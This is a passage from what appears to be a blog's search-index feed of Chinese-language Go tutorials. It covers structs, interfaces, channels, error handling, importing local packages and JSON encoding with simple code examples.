href="#结构体" class="headerlink" title="结构体"></a>结构体</h1><h2 id="结构体的定义"><a href="#结构体的定义" class="headerlink" title="结构体的定义"></a>结构体的定义</h2><p>结构体是一种自定义的数据类型，用于组合不同类型的数据字段以创建新的数据类型。每个字段可以有自己的数据类型，这使得结构体在表示复杂数据结构时非常有用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// 定义一个名为 Person 的结构体<br>type Person struct &#123;<br>    FirstName string<br>    LastName  string<br>    Age       int<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="结构体的实例化"><a href="#结构体的实例化" class="headerlink" title="结构体的实例化"></a>结构体的实例化</h2><p>结构体的实例化是创建结构体变量的过程。你可以使用<code>var</code>关键字或字面值初始化结构体实例。</p><p><strong>使用<code>var</code>关键字：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// 使用 var 关键字创建一个名为 person 的 Person 结构体实例<br>var person Person<br>person.FirstName = &quot;John&quot;<br>person.LastName = &quot;Doe&quot;<br>person.Age = 30<br></code></pre></td></tr></table></figure><p><strong>使用字面值：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// 使用字面值创建一个名为 person 的 Person 结构体实例<br>person := Person&#123;<br>    FirstName: &quot;John&quot;,<br>    LastName:  &quot;Doe&quot;,<br>    Age:       30,<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="访问结构体字段"><a href="#访问结构体字段" class="headerlink" title="访问结构体字段"></a>访问结构体字段</h2><p>你可以使用点运算符<code>.</code>来访问结构体的字段。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// 访问结构体字段<br>fmt.Println(&quot;First Name:&quot;, person.FirstName)<br>fmt.Println(&quot;Last Name:&quot;, person.LastName)<br>fmt.Println(&quot;Age:&quot;, person.Age)<br></code></pre></td></tr></table></figure><h2 id="匿名结构体"><a href="#匿名结构体" class="headerlink" title="匿名结构体"></a>匿名结构体</h2><p>Golang允许你创建匿名结构体，即没有指定结构体名称的实例。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// 创建一个匿名结构体并初始化<br>employee := struct &#123;<br>    FirstName string<br>    LastName  string<br>    Age       int<br>&#125;&#123;<br>    FirstName: &quot;Alice&quot;,<br>    LastName:  &quot;Johnson&quot;,<br>    Age:       25,<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="嵌套结构体"><a href="#嵌套结构体" class="headerlink" title="嵌套结构体"></a>嵌套结构体</h2><p>结构体可以嵌套在其他结构体内部，形成复杂的数据结构。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// 定义 Address 结构体<br>type Address struct &#123;<br>    Street  string<br>    City    string<br>    Country string<br>&#125;<br><br>// 定义 Contact 结构体，包括嵌套的 Address 结构体<br>type Contact struct &#123;<br>    Email    string<br>    Phone    string<br>    Location Address<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="结构体方法"><a href="#结构体方法" class="headerlink" title="结构体方法"></a>结构体方法</h2><p>Golang允许在结构体上定义方法，以实现与结构体关联的行为。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// 定义 Circle 结构体<br>type Circle struct &#123;<br>    Radius float64<br>&#125;<br><br>// 在 Circle 结构体上定义一个计算面积的方法<br>func (c Circle) Area() float64 &#123;<br>    return 3.14 * c.Radius * c.Radius<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="结构体的匿名字段"><a href="#结构体的匿名字段" class="headerlink" title="结构体的匿名字段"></a>结构体的匿名字段</h2><p>结构体可以包含匿名字段，即没有字段名称的字段。这可以用于创建嵌套结构体。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// 定义 Person 结构体<br>type Person struct &#123;<br>    FirstName string<br>    LastName  string<br>    Age       int<br>&#125;<br><br>// 定义 Employee 结构体，包含匿名字段 Person<br>type Employee struct &#123;<br>    Person<br>    EmployeeID int<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h1><h2 id="接口定义"><a href="#接口定义" class="headerlink" title="接口定义"></a>接口定义</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// 定义一个接口，它包含一组方法的抽象描述<br>type Writer interface &#123;<br>    Write([]byte) (int, error)<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>Writer</code> 是接口的名称。</li><li><code>Write</code> 是接口的方法，它接受一个<code>[]byte</code>参数并返回一个<code>int</code>和一个<code>error</code>。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">接口定义<br>go<br>Copy code<br>// 定义一个接口，它包含一组方法的抽象描述<br>type Writer interface &#123;<br>    Write([]byte) (int, error)<br>&#125;<br>Writer 是接口的名称。<br>Write 是接口的方法，它接受一个[]byte参数并返回一个int和一个error。<br>类型实现接口<br>go<br>Copy code<br>// 定义一个结构体类型 FileWriter<br>type FileWriter struct &#123;<br>    // 这里可以包含结构体的字段<br>&#125;<br><br>// 实现 Writer 接口的 Write 方法<br>func (f FileWriter) Write(data []byte) (int, error) &#123;<br>    // 在这里实现 Write 方法的具体逻辑<br>    // 返回写入的字节数和错误信息<br>&#125;<br>FileWriter 是一个结构体类型，表示一个文件写入器。<br>Write 方法是接口 Writer 的实现，FileWriter 类型必须实现接口中的所有方法。<br>使用接口<br>go<br>Copy code<br>func SaveData(w Writer, data []byte) error &#123;<br>    // 调用接口方法 Write 来保存数据<br>    _, err := w.Write(data)<br>    return err<br>&#125;<br>SaveData 函数接受一个实现了 Writer 接口的参数 w 和一个数据片段 data。<br>使用接口来调用 Write 方法来保存数据，并返回可能的错误。<br>接口断言<br>go<br>Copy code<br>var w Writer<br>w = FileWriter&#123;&#125;<br><br>if fw, ok := w.(FileWriter); ok &#123;<br>    // 如果 w 实现了 FileWriter 接口，就可以进行类型断言<br>    // fw 变量现在包含了 w 的值，并可以调用 FileWriter 特定的方法<br>&#125; else &#123;<br>    // 如果 w 不是 FileWriter 类型，处理逻辑<br>&#125;<br>w 是一个接口变量，可以被赋值为任何实现了 Writer 接口的值。<br>使用类型断言来检查接口变量的实际类型，并执行相应的操作。<br>空接口<br>go<br>Copy code<br>var emptyInterface interface&#123;&#125;<br>emptyInterface = 42<br>emptyInterface = &quot;Hello, World&quot;<br></code></pre></td></tr></table></figure><h2 id="类型实现接口"><a href="#类型实现接口" class="headerlink" title="类型实现接口"></a>类型实现接口</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// 定义一个结构体类型 FileWriter<br>type FileWriter struct &#123;<br>    // 这里可以包含结构体的字段<br>&#125;<br><br>// 实现 Writer 接口的 Write 方法<br>func (f FileWriter) Write(data []byte) (int, error) &#123;<br>    // 在这里实现 Write 方法的具体逻辑<br>    // 返回写入的字节数和错误信息<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>FileWriter</code> 是一个结构体类型，表示一个文件写入器。</li><li><code>Write</code> 方法是接口 <code>Writer</code> 的实现，<code>FileWriter</code> 类型必须实现接口中的所有方法。</li></ul><h2 id="使用接口"><a href="#使用接口" class="headerlink" title="使用接口"></a>使用接口</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">func SaveData(w Writer, data []byte) error &#123;<br>    // 调用接口方法 Write 来保存数据<br>    _, err := w.Write(data)<br>    return err<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>SaveData</code> 函数接受一个实现了 <code>Writer</code> 接口的参数 <code>w</code> 和一个数据片段 <code>data</code>。</li><li>使用接口来调用 <code>Write</code> 方法来保存数据，并返回可能的错误。</li></ul><h2 id="接口断言"><a href="#接口断言" class="headerlink" title="接口断言"></a>接口断言</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">var w Writer<br>w = FileWriter&#123;&#125;<br><br>if fw, ok := w.(FileWriter); ok &#123;<br>    // 如果 w 实现了 FileWriter 接口，就可以进行类型断言<br>    // fw 变量现在包含了 w 的值，并可以调用 FileWriter 特定的方法<br>&#125; else &#123;<br>    // 如果 w 不是 FileWriter 类型，处理逻辑<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>w</code> 是一个接口变量，可以被赋值为任何实现了 <code>Writer</code> 接口的值。</li><li>使用类型断言来检查接口变量的实际类型，并执行相应的操作。</li></ul><h2 id="空接口"><a href="#空接口" class="headerlink" title="空接口"></a>空接口</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">var emptyInterface interface&#123;&#125;<br>emptyInterface = 42<br>emptyInterface = &quot;Hello, World&quot;<br></code></pre></td></tr></table></figure><h1 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h1><h2 id="定义管道"><a href="#定义管道" class="headerlink" title="定义管道"></a>定义管道</h2><p>在Golang中，管道是用于在不同goroutines之间进行通信和同步的数据结构。定义一个管道如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// 创建一个整数类型的管道<br>ch := make(chan int)<br><br>// 发送数据到管道<br>ch &lt;- 6<br>// 释放数据<br>&lt;- ch<br></code></pre></td></tr></table></figure><h2 id="发送和接收数据"><a href="#发送和接收数据" class="headerlink" title="发送和接收数据"></a>发送和接收数据</h2><p>可以使用<code>&lt;-</code>操作符来发送和接收数据。在发送数据时，数据将被放入管道中，并在接收端被读取。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// 发送数据到管道<br>ch &lt;- 6<br><br>// 从管道接收数据<br>value := &lt;-ch<br></code></pre></td></tr></table></figure><h2 id="无缓冲管道"><a href="#无缓冲管道" class="headerlink" title="无缓冲管道"></a>无缓冲管道</h2><p>默认情况下，创建的管道是无缓冲的，发送操作会阻塞，直到有goroutine准备好接收数据，接收操作也会阻塞，直到有数据可用。</p><h2 id="缓冲管道"><a href="#缓冲管道" class="headerlink" title="缓冲管道"></a>缓冲管道</h2><p>可以创建具有缓冲区的管道，以在发送时不会立即阻塞，只有在缓冲区满时才会阻塞。例如，创建一个容量为3的缓冲管道：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// 创建一个容量为3的缓冲管道<br>ch := make(chan int, 3)<br></code></pre></td></tr></table></figure><h2 id="关闭管道"><a href="#关闭管道" class="headerlink" title="关闭管道"></a>关闭管道</h2><p>当不再需要向管道发送数据时，可以关闭管道。关闭管道后，无法再向其发送数据，但仍然可以从中接收数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// 关闭管道<br>close(ch)<br></code></pre></td></tr></table></figure><h2 id="使用select语句"><a href="#使用select语句" class="headerlink" title="使用select语句"></a>使用<code>select</code>语句</h2><p><code>select</code>语句用于在多个管道操作中选择一个可用的操作。它允许goroutine在多个通信操作之间等待，并在其中一个操作准备就绪时执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select &#123;<br>case value := &lt;-ch1:<br>    // 从管道 ch1 接收数据<br>case ch2 &lt;- 6:<br>    // 向管道 ch2 发送数据<br>case ch3 &lt;- &quot;Hello&quot;:<br>    // 向管道 ch3 发送数据<br>default:<br>    // 如果没有操作准备就绪，执行默认操作<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h1><h2 id="错误类型"><a href="#错误类型" class="headerlink" title="错误类型"></a>错误类型</h2><p>在 Golang 中，错误通常表示为一个实现了 <code>error</code> 接口的类型。这个接口只有一个方法 <code>Error() string</code>，用于返回错误的描述信息。标准库中提供了 <code>errors</code> 包来创建简单的错误。</p><p>示例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package main<br><br>import (<br>    &quot;errors&quot; // 导入 errors 包，用于创建错误<br>    &quot;fmt&quot;<br>)<br><br>// divide 函数接受两个整数参数 a 和 b，尝试计算 a/b，如果 b 为零则返回错误<br>func divide(a, b int) (int, error) &#123;<br>    if b == 0 &#123;<br>        return 0, errors.New(&quot;除数不能为零&quot;) // 创建一个包含错误信息的新错误<br>    &#125;<br>    return a / b, nil<br>&#125;<br><br>func main() &#123;<br>    result, err := divide(10, 2) // 调用 divide 函数<br>    if err != nil &#123;<br>        fmt.Println(&quot;出现错误:&quot;, err) // 如果 err 不为空，输出错误信息<br>    &#125; else &#123;<br>        fmt.Println(&quot;结果:&quot;, result) // 否则输出结果<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="错误检查"><a href="#错误检查" class="headerlink" title="错误检查"></a>错误检查</h2><p>在 Golang 中，你通常会检查函数返回的错误，以便在错误发生时采取适当的措施。</p><p>示例:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">file, err := os.Open(&quot;example.txt&quot;) // 尝试打开文件<br>if err != nil &#123; // 检查是否有错误<br>    fmt.Println(&quot;无法打开文件:&quot;, err) // 如果有错误，输出错误信息<br>    return<br>&#125;<br>defer file.Close() // 确保在函数结束时关闭文件<br><br>// 继续处理文件<br></code></pre></td></tr></table></figure><h2 id="自定义错误"><a href="#自定义错误" class="headerlink" title="自定义错误"></a>自定义错误</h2><p>你可以创建自定义错误类型，以提供更多有关错误的信息，以及更好的错误处理。</p><p>示例:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package main<br><br>import &quot;fmt&quot;<br><br>// CustomError 是一个自定义错误类型<br>type CustomError struct &#123;<br>    message string // 错误消息<br>    code    int    // 错误代码<br>&#125;<br><br>// Error 方法实现了 error 接口，用于返回错误的描述信息<br>func (e CustomError) Error() string &#123;<br>    return e.message<br>&#125;<br><br>func main() &#123;<br>    err := CustomError&#123;&quot;自定义错误消息&quot;, 123&#125; // 创建自定义错误<br>    fmt.Println(&quot;出现自定义错误:&quot;, err) // 输出自定义错误信息<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Panic-和-Recover"><a href="#Panic-和-Recover" class="headerlink" title="Panic 和 Recover"></a>Panic 和 Recover</h2><p>有时，程序可能会遇到无法恢复的错误，此时可以使用 <code>panic</code> 函数来抛出异常。然后，可以使用 <code>recover</code> 函数来捕获异常并进行恢复操作。</p><p>示例:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package main<br><br>import &quot;fmt&quot;<br><br>// exampleFunction 包含了 panic 和 recover 的用法<br>func exampleFunction() &#123;<br>    defer func() &#123; // 使用 defer 声明匿名函数，用于捕获 panic<br>        if r := recover(); r != nil &#123;<br>            fmt.Println(&quot;恢复异常:&quot;, r) // 恢复 panic，输出异常信息<br>        &#125;<br>    &#125;()<br>    panic(&quot;出现了一个恐慌&quot;) // 抛出 panic<br>&#125;<br><br>func main() &#123;<br>    exampleFunction() // 调用包含 panic 的函数<br>    fmt.Println(&quot;程序继续执行&quot;) // 输出此行内容<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang 不同目录导包</title>
      <link href="/2022/05/20/%E8%AF%AD%E8%A8%80/Go/%E5%85%B6%E4%BB%96/go%E5%AF%BC%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8C%85/"/>
      <url>/2022/05/20/%E8%AF%AD%E8%A8%80/Go/%E5%85%B6%E4%BB%96/go%E5%AF%BC%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<h1 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">└─main<br>    │  go.mod<br>    │  main.go<br>    │<br>    └─utils<br>            qqq.go<br></code></pre></td></tr></table></figure><h1 id="生成-go-md"><a href="#生成-go-md" class="headerlink" title="生成 go.md"></a>生成 go.md</h1><p>在 <code>main</code> 目录下使用如下命令生成 <code>go.mod</code> 文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">go mod init main<br></code></pre></td></tr></table></figure><p><code>go.md</code> 内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">module main<br><br>go 1.18<br></code></pre></td></tr></table></figure><p>将需要的依赖增加到 <code>go.mod</code> 文件中并去掉不需要的依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">go mod tidy<br></code></pre></td></tr></table></figure><h1 id="main-go"><a href="#main-go" class="headerlink" title="main.go"></a>main.go</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">└─main<br>    │  go.mod<br>    │  main.go<br>    │<br>    └─utils<br>            qqq.go<br></code></pre></td></tr></table></figure><p><code>main.go</code> 内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package main<br><br>import &quot;main/utils&quot;<br><br>func main()&#123;<br>aaa.Qqq()<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="go-md"><a href="#go-md" class="headerlink" title="go.md"></a>go.md</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">└─main<br>    │  go.mod<br>    │  main.go<br>    │<br>    └─utils<br>            qqq.go<br></code></pre></td></tr></table></figure><p><code>qqq.go</code> 内容如下 (<strong>注：方法名首字母需大写，否则无法调用</strong>)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package aaa// 包名建议与目录名相同<br><br>import &quot;fmt&quot;<br><br>func Qqq()&#123;<br>fmt.Println(&quot;qqq&quot;)<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go Json</title>
      <link href="/2022/05/20/%E8%AF%AD%E8%A8%80/Go/%E5%BA%93/json/"/>
      <url>/2022/05/20/%E8%AF%AD%E8%A8%80/Go/%E5%BA%93/json/</url>
      
        <content type="html"><![CDATA[<h1 id="json"><a href="#json" class="headerlink" title="json"></a>json</h1><h2 id="普通-json"><a href="#普通-json" class="headerlink" title="普通 json"></a>普通 json</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">type st1 struct &#123;<br>Test1 string `json:&quot;test1&quot;&#x27;`<br>Test2 string `json:&quot;test2&quot;`<br>// `json:&quot;Test3,omitempty&quot;`// 如果为空置则忽略字段<br>&#125;<br>func jsonTest()&#123;<br>raw := st1&#123;&quot;111&quot;, &quot;222&quot;&#125;<br>raw2,_ := json.Marshal(raw)<br><br>var js1 st1<br>_ = json.Unmarshal(raw2, &amp;js1)<br>fmt.Println(js1.Test2)<br>&#125;<br></code></pre></td></tr></table></figure><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">type st1 struct &#123;<br>Test1 string `json:&quot;test1&quot;&#x27;`<br>Test2 string `json:&quot;test2&quot;`<br>//Test3 st2<br>&#125;<br>func jsonTest()&#123;<br>raw2 := []byte(`&#123;&quot;Test1&quot;:&quot;111&quot;, &quot;Test2&quot;:&quot;222&quot;&#125;`)<br>var js1 st1<br>fmt.Println(js1)<br>_ = json.Unmarshal(raw2, &amp;js1)<br>fmt.Println(js1.Test2)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="内嵌json"><a href="#内嵌json" class="headerlink" title="内嵌json"></a>内嵌json</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">type st2 struct &#123;<br>Name string<br>Pass string<br>&#125;<br><br>type st1 struct &#123;<br>Test1 string<br>Test2 string<br>Test3 st2<br>&#125;<br>func jsonTest()&#123;<br>jsonData := []byte(`&#123;&quot;test1&quot;:&quot;1&quot;,&quot;test2&quot;:&quot;2&quot;,&quot;test3&quot;: &#123;&quot;name&quot;:&quot;admin&quot;,&quot;pass&quot;:&quot;123&quot;&#125;&#125;`)<br><br>var actress st1<br>_ = json.Unmarshal(jsonData, &amp;actress)<br>fmt.Println(actress.Test3.Name)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="内嵌数组"><a href="#内嵌数组" class="headerlink" title="内嵌数组"></a>内嵌数组</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">type st2 struct &#123;<br>Name string<br>Pass string<br>&#125;<br><br>type st1 struct &#123;<br>Test1 string<br>Test2 string<br>Test3 []st2<br>&#125;<br>func jsonTest()&#123;<br>jsonData := []byte(`&#123;&quot;test1&quot;:&quot;1&quot;,&quot;test2&quot;:&quot;2&quot;,&quot;test3&quot;: [&#123;&quot;name&quot;:&quot;admin&quot;,&quot;pass&quot;:&quot;123&quot;&#125;,&#123;&quot;name&quot;:&quot;test&quot;,&quot;pass&quot;:&quot;123&quot;&#125;]&#125;`)<br><br>var js1 st1<br>_ = json.Unmarshal(jsonData, &amp;js1)<br>//fmt.Println(js1.Test3[0])<br><br>for _,val := range 